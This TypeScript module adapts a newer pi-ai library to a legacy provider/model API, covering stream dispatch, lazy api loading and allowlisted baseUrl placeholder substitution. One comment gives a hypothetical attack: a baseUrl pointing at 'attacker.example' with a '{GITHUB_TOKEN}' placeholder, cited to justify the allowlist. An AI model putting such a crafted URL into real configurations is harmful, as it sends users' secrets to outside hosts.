/**
 * Factory-branch `PiAiModule` surface (design D3/D4/D5).
 *
 * Synthesizes the legacy seven-member global API over a ≥0.85 pi-ai:
 *
 * - `getProviders()` PROJECTS `Provider` objects to id STRINGS. The legacy
 *   contract is `() => string[]`, and feeding objects back into `getModels()`
 *   returns ZERO models with no error — a 200 with an empty catalogue, which
 *   is the exact failure mode that produced the original bug.
 * - `streamSimple` normalizes the transcript with the RESOLVED runtime's own
 *   `normalizeContext`, then dispatches API-FIRST: `model.api` → lazy api
 *   implementation, and api-ONLY when the model names one (an unmapped or
 *   unloadable api THROWS). The owning built-in provider is consulted only when
 *   the model carries no `api` at all — a provider fallback for an unmapped api
 *   would silently stream through the WRONG protocol, because `createProvider`'s
 *   single-api form ignores `model.api` entirely. It never goes through
 *   `Models.streamSimple`, which resolves auth and throws
 *   `Provider is not configured` for OAuth-only providers handed a caller key.
 *
 * Nothing is registered into the built-in collection: registering custom
 * providers would make them visible to `getProviders()`, and
 * `InternalRegistry.getAllModels()` would then source them in the built-in
 * pass, discarding the native `models.json` capability projection.
 *
 * See change: adopt-piai-factory-api-registry.
 */
import { API_LAZY_TABLE } from "./api-table.js";
import { derivePiAiSubpath } from "./subpath.js";
import type { AdaptDeps, PiAiModule } from "./types.js";

/** pi-ai's `Models` collection — only the members the seam consumes. */
interface BuiltinModels {
  getProviders: () => Array<{ id: string } | string>;
  getProvider: (id: string) => ProviderStreams | undefined;
  getModels: (provider: string) => any[];
  getModel: (provider: string, modelId: string) => any;
}

interface ProviderStreams {
  streamSimple: (model: any, context: any, options?: any) => AsyncIterable<any>;
}

type NormalizeContext = (context: any) => any;

/** `{VAR}` placeholders a provider bakes into `Model.baseUrl`. */
const BASE_URL_PLACEHOLDER = /\{([A-Z_][A-Z0-9_]*)\}/g;

/**
 * The ONLY placeholder names the seam may substitute.
 *
 * Restoring 0.75.5's behaviour must not turn the seam into a generic
 * environment reader: a bare `{VAR}` scan of `process.env` would let any
 * model's `baseUrl` — including one from a user-authored or discovered
 * provider entry — splice an arbitrary secret into an outbound URL
 * (`baseUrl: "https://attacker.example/{GITHUB_TOKEN}"`). Every built-in
 * `baseUrl` that contains a placeholder uses exactly these two names, so an
 * allowlist is full parity for every real model.
 */
const BASE_URL_PLACEHOLDERS: ReadonlySet<string> = new Set([
  "CLOUDFLARE_ACCOUNT_ID",
  "CLOUDFLARE_GATEWAY_ID",
]);

/**
 * Restore 0.75.5's baseUrl-placeholder substitution (task 1.11 finding).
 *
 * MEASURED REGRESSION, not a new feature. In 0.75.5 the api implementations
 * themselves called `resolveCloudflareBaseUrl(model)`, substituting `{VAR}`
 * from `process.env`. In >=0.85 that moved OUT of the api implementations
 * into `cloudflareStreams`, a PROVIDER-level wrapper reading `options.env` —
 * which `Models.applyAuth` supplies and the dashboard never does. So under
 * >=0.85 BOTH dispatch paths leave the placeholder unresolved and the request
 * goes to a literal `{CLOUDFLARE_ACCOUNT_ID}` URL.
 *
 * Substituting here restores the old semantics: caller-supplied `env` first,
 * then ambient `process.env`, for ALLOWLISTED names only. A model with no
 * placeholder is returned by IDENTITY, and an unresolvable placeholder is left
 * verbatim rather than throwing — dispatch stays the caller's decision, and
 * the upstream error names the URL.
 */
function resolveBaseUrlPlaceholders(model: any, env?: Record<string, string>): any {
  const baseUrl: unknown = model?.baseUrl;
  if (typeof baseUrl !== "string" || !baseUrl.includes("{")) return model;
  const resolved = baseUrl.replace(BASE_URL_PLACEHOLDER, (match, name: string) => {
    if (!BASE_URL_PLACEHOLDERS.has(name)) return match;
    // An EMPTY value is not a substitution: `{VAR}` → "" yields a malformed
    // URL (`v1///compat`) that fails somewhere unrelated. Keep the placeholder
    // so the upstream error still names it.
    const value = env?.[name] ?? process.env[name];
    if (typeof value !== "string" || !value) return match;
    // Encoded, so the value cannot escape its URL position. Inert for the real
    // account/gateway ids (hex/alphanumeric) but it makes a crafted `baseUrl`
    // — from a user-authored or discovered provider entry — incapable of
    // injecting a query string, fragment, or path segment.
    return encodeURIComponent(value);
  });
  return resolved === baseUrl ? model : { ...model, baseUrl: resolved };
}

/** Provider ids are strings on the legacy contract; objects on ≥0.85. */
function providerId(p: { id: string } | string): string {
  return typeof p === "string" ? p : p.id;
}

export interface FactorySurfaceDeps extends Required<Pick<AdaptDeps, "importPath" | "exists">> {
  resolvedPath: string;
  /** The resolved pi-ai root module. */
  module: Record<string, any>;
}

/**
 * Build the factory-branch surface. Every async load happens HERE, during
 * construction, so the returned `PiAiModule` is fully synchronous —
 * `InternalRegistry.getAllModels()` consumes it synchronously.
 */
export async function buildFactorySurface(deps: FactorySurfaceDeps): Promise<PiAiModule> {
  const { module: mod, resolvedPath } = deps;

  // ── built-in model collection ───────────────────────────────────────────
  const allPath = derivePiAiSubpath(resolvedPath, "providers/all.js");
  if (!deps.exists(allPath)) {
    throw new Error(
      `pi-ai factory adaptation: built-in provider collection not found at "${allPath}" ` +
        `(resolved module: "${resolvedPath}")`,
    );
  }
  const allMod = (await deps.importPath(allPath)) as Record<string, any>;
  const builtinModelsFactory = allMod.builtinModels;
  if (typeof builtinModelsFactory !== "function") {
    throw new Error(
      `pi-ai factory adaptation: "${allPath}" exports no builtinModels() factory`,
    );
  }
  // ONE collection, built once and cached: rebuilding per call would re-run
  // provider construction on every `/api/models`.
  const models = builtinModelsFactory() as BuiltinModels;

  // ── normalizeContext, from the RESOLVED module ──────────────────────────
  // Never a bare `import("@earendil-works/pi-ai/utils/transcript")`: that would
  // bind whichever copy `shared` resolves, which may be a DIFFERENT generation
  // than the one the registry resolved.
  const normalizeContext = await resolveNormalizeContext(mod, resolvedPath, deps);

  // ── memoized lazy api implementations ───────────────────────────────────
  const apiCache = new Map<string, ProviderStreams>();
  /** Why a table-mapped api could not be materialized. Diagnostics only. */
  const apiLoadErrors = new Map<string, string>();
  const loadApi = async (api: string): Promise<ProviderStreams | undefined> => {
    const cached = apiCache.get(api);
    if (cached) return cached;
    const entry = API_LAZY_TABLE[api];
    if (!entry) return undefined;
    const path = derivePiAiSubpath(resolvedPath, entry.module);
    if (!deps.exists(path)) {
      apiLoadErrors.set(api, `its lazy module is absent at "${path}"`);
      return undefined;
    }
    try {
      const loaded = (await deps.importPath(path)) as Record<string, any>;
      const factory = loaded[entry.exportName];
      if (typeof factory !== "function") {
        apiLoadErrors.set(api, `"${path}" exports no "${entry.exportName}" factory`);
        return undefined;
      }
      const streams = factory() as ProviderStreams;
      if (!streams || typeof streams.streamSimple !== "function") {
        apiLoadErrors.set(api, `"${entry.exportName}"() yielded no streamSimple`);
        return undefined;
      }
      apiCache.set(api, streams);
      return streams;
    } catch (err) {
      // RECORDED, never swallowed: a mapped api that failed to load must
      // surface as a diagnosable dispatch error, not as a fallback to a
      // DIFFERENT api. See the dispatch comment below.
      apiLoadErrors.set(api, (err as Error).message);
      return undefined;
    }
  };

  // Warm every mapped api up front so a broken table surfaces at construction
  // rather than on the first user request. Best-effort by design: one absent api
  // module must not 503 the whole registry, so the reason is retained above for
  // dispatch-time diagnosis instead.
  await Promise.all(Object.keys(API_LAZY_TABLE).map((api) => loadApi(api)));

  return {
    // Still invoked by the InternalRegistry constructor; a no-op on ≥0.85
    // because there is no global collection to populate.
    registerBuiltInApiProviders: () => {},
    // PROJECTION, not passthrough. See the module docblock.
    getProviders: () => models.getProviders().map(providerId),
    getModels: (provider: string) => models.getModels(provider) ?? [],
    getModel: (provider: string, modelId: string) => models.getModel(provider, modelId),
    // No repo caller; registering would perturb catalogue composition (D4).
    registerApiProvider: () => {},
    unregisterApiProviders: () => {},
    streamSimple: (model: any, context: any, options?: any) =>
      dispatchStream({
        model,
        context,
        options,
        models,
        normalizeContext,
        apiCache,
        apiLoadErrors,
      }),
  };
}

/**
 * Resolve `normalizeContext` from the resolved runtime: root export first,
 * then the derived `utils/transcript.js`. 0.75.5 ships neither, which is why
 * this is factory-branch-only.
 */
async function resolveNormalizeContext(
  mod: Record<string, any>,
  resolvedPath: string,
  deps: Required<Pick<AdaptDeps, "importPath" | "exists">>,
): Promise<NormalizeContext> {
  if (typeof mod.normalizeContext === "function") return mod.normalizeContext as NormalizeContext;
  const path = derivePiAiSubpath(resolvedPath, "utils/transcript.js");
  if (deps.exists(path)) {
    const loaded = (await deps.importPath(path)) as Record<string, any>;
    if (typeof loaded.normalizeContext === "function") return loaded.normalizeContext as NormalizeContext;
  }
  throw new Error(
    `pi-ai factory adaptation: normalizeContext not found on the root export nor at "${path}" ` +
      `(resolved module: "${resolvedPath}"). Dispatching without it would silently drop ` +
      "the system prompt and every tool definition.",
  );
}

/**
 * API-FIRST dispatch (design D3), and API-ONLY when the model names an api.
 *
 * `InternalRegistry` deliberately retains a custom model authored under a
 * built-in provider name, and 0.75.5 dispatched purely on `model.api`. Falling
 * back to the built-in PROVIDER when the api is unmapped or failed to load is
 * NOT a safe degradation, because `createProvider`'s single-api form ignores
 * `model.api` entirely:
 *
 *     const apiFor = (model) => single ?? byApi?.[model.api];
 *
 * `cloudflare-workers-ai` is exactly such a provider, so a custom model under
 * it declaring `api: "anthropic-messages"` would be streamed through the
 * OpenAI-completions api — silently the WRONG protocol, where 0.75.5 threw.
 * An unmapped api is therefore a DISPATCH ERROR naming the api and the model,
 * carrying no credential material. The provider is consulted only when the
 * model names no api at all (no discriminator to route on).
 */
function dispatchStream(args: {
  model: any;
  context: any;
  options?: any;
  models: BuiltinModels;
  normalizeContext: NormalizeContext;
  apiCache: Map<string, ProviderStreams>;
  apiLoadErrors: Map<string, string>;
}): AsyncIterable<any> {
  const { model, context, options, models, normalizeContext, apiCache, apiLoadErrors } = args;
  const transcript = normalizeContext(context);

  const provider = String(model?.provider);
  const modelId = String(model?.id);
  const api = typeof model?.api === "string" && model.api ? model.api : undefined;

  let streams: ProviderStreams | undefined;
  if (api) {
    streams = apiCache.get(api);
    if (!streams) {
      const detail = apiLoadErrors.get(api);
      throw new Error(
        `pi-ai factory adaptation: no api implementation available for api "${api}" ` +
          `(model "${provider}/${modelId}")${detail ? ` — ${detail}` : ""}`,
      );
    }
  } else {
    streams = provider ? models.getProvider(provider) : undefined;
    if (!streams) {
      throw new Error(
        `pi-ai factory adaptation: model "${provider}/${modelId}" names no api and ` +
          `provider "${provider}" is not a built-in provider`,
      );
    }
  }

  const dispatchModel = resolveBaseUrlPlaceholders(model, options?.env);

  // Caller options pass through WHOLE (signal, env, maxTokens, …) so abort
  // propagation and provider-env handling are not silently dropped; the
  // caller's apiKey/headers are already the only credentials in `options`
  // (getAuth is never reached on this path), so they win by construction.
  return streams.streamSimple(dispatchModel, transcript, options);
}
